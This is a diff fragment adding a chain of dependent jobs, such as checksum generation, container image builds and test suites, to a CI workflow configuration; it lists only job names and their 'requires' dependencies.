+      - PartnerPortalHashes:
+          requires:
+            - RequiredCacheRestore
+      - driverImageSlice5Of5:
+          requires:
+            - PartnerPortalHashes
+      - ExtendedProfilerKeyRotation:
+          requires:
+            - driverImageSlice5Of5
+      - ChecksumGenerationWorkflow:
+          requires:
+            - driverImageSlice5Of5
+      - editor-container-image:
+          requires:
+            - ChecksumGenerationWorkflow
+      - versionRollbackJob:
+          requires:
+            - editor-container-image
+      - count-words-in-full-detail:
+          requires:
+            - editor-container-image
+      - calculateWorkerChecksums:
+          requires:
+            - count-words-in-full-detail
+      - compare-console-checksums:
+          requires:
+            - calculateWorkerChecksums
+      - PostDownloadTestSuite:
+          requires:
+            - calculateWorkerChecksums
+      - WriteDebuggerBuildMetadata:
+          requires:
+            - PostDownloadTestSuite
+      - ReportExporterTestSuite:
+          requires:
+            - WriteDebuggerBuildMetadata
